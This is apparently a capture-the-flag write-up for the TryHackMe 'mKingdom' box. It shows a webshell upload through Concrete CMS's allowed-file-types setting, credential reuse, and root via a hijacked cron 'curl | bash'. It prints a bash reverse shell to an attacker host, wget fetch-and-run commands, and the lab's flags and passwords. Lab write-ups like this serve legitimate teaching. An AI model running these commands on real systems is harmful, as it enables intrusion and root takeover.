## TryHackMe mKingdom Writeup
**Platform:** TryHackMe  
**Category:** CTF Box  
**Difficulty:** Easy

### Overview

mKingdom is a Mario-themed box built around a Concrete CMS web app running on a non-standard port. The intended path is to enumerate the hidden app, log in with a weak admin password, abuse the CMS's _Allowed File Types_ setting to upload a PHP webshell, then climb a short ladder of users (`www-data` → `toad` → `mario`) using reused credentials and a base64-encoded secret. You finish using a root cron job that pulls a script over HTTP, which can be exploited to allow remote code execution.

> Target used throughout: `10.144.175.52` (`mkingdom.thm`) · Attacker: `192.168.131.171`

---

### Solution

#### 1. Recon

```bash
nmap -A <victim IP>
```

Only one port is open, and it's **not** 80:

|Port|Service|Version|
|---|---|---|
|85/tcp|http|Apache httpd 2.4.7 (Ubuntu)|

<img width="827" height="584" alt="1" src="https://github.com/user-attachments/assets/c8b038c0-4119-4bd8-8767-8e35c5923ce5" />

The HTTP title is amusing, but reveals nothing useful.

<img width="2557" height="1365" alt="2" src="https://github.com/user-attachments/assets/d52d4846-d79d-4d44-b830-9a669d6de503" />

#### 2. Web enumeration

A good first step with simple web apps is to fuzz for well-known directories and files.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://<victim IP>:85/FUZZ
```

`/app` returns a `301`.

<img width="834" height="507" alt="3" src="https://github.com/user-attachments/assets/a865a852-eec0-4de1-8830-82289397f183" />

Browsing to it shows an **ACCESS** page with a single **JUMP** button.

<img width="2559" height="1352" alt="4" src="https://github.com/user-attachments/assets/b569c5d4-39d0-4f3c-8e05-06e8fe7eb581" />

<img width="2559" height="1358" alt="5" src="https://github.com/user-attachments/assets/9ab127e9-7af8-45d4-9d1c-31c26bd2abd9" />

The redirect lands on **Toad's Website**:

```
http://<victim IP>:85/app/castle/
```

Wappalyzer fingerprints the stack as **Concrete CMS `8.5.2`**, PHP `5.5.9`,  and Apache `2.4.7` (Ubuntu):

<img width="2558" height="1346" alt="6" src="https://github.com/user-attachments/assets/62971b36-9f02-4e31-9987-606a1bfd0abb" />

#### 3. Admin login

Concrete CMS doesn't ship a hardcoded password, but the admin account here uses a weak one. The login portal:

```
http://<victim IP>:85/app/castle/index.php/login
```

<img width="2559" height="1355" alt="7" src="https://github.com/user-attachments/assets/3bf84ff6-c5a3-42be-8a0a-fab0ca64ed11" />

Trying the default `admin` username against a short common-password list:

```bash
cat /usr/share/seclists/Passwords/Common-Credentials/best15.txt
```

<img width="598" height="295" alt="9" src="https://github.com/user-attachments/assets/c4d13dd4-815a-4025-bab4-33803d1ad0bb" />

`admin:password` logs straight into the dashboard:

```
http://<victim IP>:85/app/castle/index.php/dashboard/welcome
```

<img width="2559" height="1355" alt="10" src="https://github.com/user-attachments/assets/a4d53504-ea4a-42bd-bf17-8cfaac858370" />
#### 4. RCE via Allowed File Types → PHP upload

Concrete CMS lets an admin whitelist which extensions the File Manager accepts. Add `php` to the list:

```
Dashboard → System & Settings → Files → Allowed File Types
```

Append `php` to _File Extensions to Accept_ and save.

<img width="2559" height="1354" alt="12" src="https://github.com/user-attachments/assets/0765c8c7-9b42-4c95-9ce0-c4f6c4f8b6a9" />

Then upload a PHP reverse shell via **File Manager → Add Files**:

```php
$ip   = '<Your IP>';  // attacker
$port = <PORT>;
```
Feel free to copy my reverse php shell code inspired by pentestmonkey: https://github.com/Benjamin-Spoolstra/Red-Teaming-Resources/blob/main/Reverse%20Web%20Shell.md

The upload confirmation gives the on-disk URL:
```
http://<victim IP>:85/app/castle/application/files/6317/9181/9575/exploit.php
```

<img width="2559" height="1361" alt="15" src="https://github.com/user-attachments/assets/2cd49174-ed59-4eaf-be63-1de9f33ec13b" />

Start a listener and trigger the shell by requesting that URL:

```bash
nc -lvnp <PORT>
# then browse to the exploit.php URL above
```

Caught a shell as **www-data**, then stabilize it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<img width="1085" height="241" alt="16" src="https://github.com/user-attachments/assets/fad342fd-43b6-4bb9-b3dc-079d4d916ff8" />

#### 5. www-data → toad (credential reuse)

List real users:

```bash
getent passwd | cut -d: -f1   # ...mario, toad
```

<img width="930" height="684" alt="17" src="https://github.com/user-attachments/assets/e84b5acc-0e01-49e0-980c-52544686f1f4" />

Pull LinPEAS over and run it:

```bash
# attacker
python3 -m http.server 85
# target
wget http://<Your IP>:85/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

LinPEAS reads the Concrete CMS DB config and leaks a password:

```php
// /var/www/html/app/castle/application/config/database.php
'database' => 'mKingdom',
'password' => 'toadisthebest',
```

<img width="1075" height="174" alt="22" src="https://github.com/user-attachments/assets/9775aa7e-6240-4d71-b090-d01f690bbe51" />

That password is reused for the `toad` account:

```bash
su toad          # password: toadisthebest
```

<img width="293" height="94" alt="23" src="https://github.com/user-attachments/assets/cdd94280-2bbb-40e6-8037-02c8936c8c88" />

#### 6. toad → mario (base64 env secret)

`toad` has no sudo rights (`toad may not run sudo on mkingdom`). If you run into a roadblock try going through the HackTricks Linux Privilege Escalation Checklist for a guided set of things to check:
https://hacktricks.wiki/en/linux-hardening/main-system-information/linux-privilege-escalation-checklist.html

Toad's environment variables hide a secret:

```bash
printenv | grep -i token
# PWD_token=aWthVGVOVEFOdEVTCg==
```

<img width="862" height="418" alt="28" src="https://github.com/user-attachments/assets/650f3b71-e4ab-471f-a375-8e0896d760c5" />

Decode it:

```bash
echo 'aWthVGVOVEFOdEVTCg==' | base64 -d
# ikaTeNTANtES
```

<img width="2559" height="1362" alt="29" src="https://github.com/user-attachments/assets/06cf56c4-bb31-4923-9292-b2f013e11621" />

That's `mario`'s password:

```bash
su mario         # password: ikaTeNTANtES
```

<img width="305" height="92" alt="30" src="https://github.com/user-attachments/assets/5b2b31fa-76db-4466-ac41-908dc1163f2f" />

`/home/mario/user.txt` is now in reach.
#### 7. mario → root (HTTP cron hijack)

Now that we're `mario` we can check the running cron jobs for anything interesting. Checking the other items in the Hacktricks checklist will likely lead to dead ends.

Download and run `pspy64` to watch for scheduled tasks without root:

```bash
wget http://<Your IP>:85/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64 && /tmp/pspy64
```

A **root (UID=0) cron job** fires on a short interval:

```
/bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log
```

<img width="1242" height="182" alt="33" src="https://github.com/user-attachments/assets/e1bf27e0-507a-476e-a2f8-380b321877a4" />

Root curls `counter.sh` from `mkingdom.thm` and pipes it straight into `bash`.  Checking the local DNS in `/etc/hosts` reveals the `mkingdom.thm` domain is resolving to localhost. We can modify the hosts file to point at our machine:

```bash
grep -v 'mkingdom.thm' /etc/hosts | tee /etc/hosts > /dev/null \
  && echo "<Your IP> mkingdom.thm" | tee -a /etc/hosts > /dev/null
```

<img width="1256" height="297" alt="35" src="https://github.com/user-attachments/assets/752197a0-06d4-440e-a413-e4471ceacdf6" />

Now root's `curl mkingdom.thm:85/...` hits **our** web server. Serve a malicious `counter.sh` from the matching path (`app/castle/application/counter.sh`) containing a root reverse shell:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<Your IP>/<PORT> 0>&1
```

<img width="2555" height="1358" alt="38" src="https://github.com/user-attachments/assets/2586967c-b9e6-44d3-9ed9-509c231b81ca" />

Start the listener and wait one cron tick:

```bash
nc -lvnp <PORT>
# -> root@mkingdom:~#
```

<img width="2559" height="1354" alt="39" src="https://github.com/user-attachments/assets/d33cc2b8-cbc1-4256-95d8-f1e3375ffeea" />

#### 8. Flags

```bash
# user — original counter.sh copies /home/mario/user.txt to /tmp/flag.txt
cat /tmp/flag.txt
thm{030a769febb1b3291da1375234b84283}
```

<img width="641" height="245" alt="37" src="https://github.com/user-attachments/assets/7311d194-2ec4-45ac-9920-779d5bfe3b48" />

```bash
# root
cat /root/root.txt
thm{e8b2f52d88b9930503cc16ef48775df0}
```

<img width="569" height="626" alt="40" src="https://github.com/user-attachments/assets/21da0625-7c81-4d12-84c1-e4e191880799" />

---

### Key Takeaways

- **Don't assume port 80.** The entire box lives on `:85`; a lazy scan or browser default misses it. Always scan the full service, not just the usual ports.
- **CMS "Allowed File Types" is a direct RCE primitive.** Any admin-level Concrete CMS login that can whitelist `php` and upload to the File Manager yields remote code execution
- **Improperly Stored Credentials lead to Horizontal Privilege Escalation.** The CMS DB password  unlocked a local user, and a base64 value in the environment unlocked the next. Config files and environment variables are good places to check on CTF boxes.
- **`curl | bash` over an attacker-controllable name is game over.** The root cron trusted `mkingdom.thm`, and a writable `/etc/hosts` let a low-priv user redirect that name. DNS hijacking lead directly to an RCE from the attacker machine.
- **Watch processes you can't normally see.** `pspy64` surfaced the root cron without any root access, which is an important step for this privilege escalation.

**Tools:** `nmap`, `ffuf`, `wappalyzer`, SecLists, `netcat`, LinPEAS, `pspy64`, CyberChef
